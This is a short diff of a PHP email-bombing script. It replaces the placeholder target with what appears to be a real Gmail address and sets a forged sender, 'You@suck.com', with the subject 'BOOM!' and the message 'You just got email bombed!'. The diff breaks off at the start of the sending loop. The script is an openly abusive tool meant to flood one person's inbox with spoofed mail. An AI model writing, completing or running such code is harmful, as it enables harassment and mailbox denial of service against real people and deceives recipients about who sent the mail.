@@ -1,11 +1,11 @@
 <?php
 
-$targetmail = "target@email.com";
+$targetmail = "neus2benen@gmail.com";
 $subject = "BOOM!";
 $message = "You just got email bombed!";
 $amount = 10;
 $sentmail = 1; //Do not change
-$frommail = "your@email.com"; // sender
+$frommail = "You@suck.com"; // sender
 
 
 while($sentmail<=$amount)
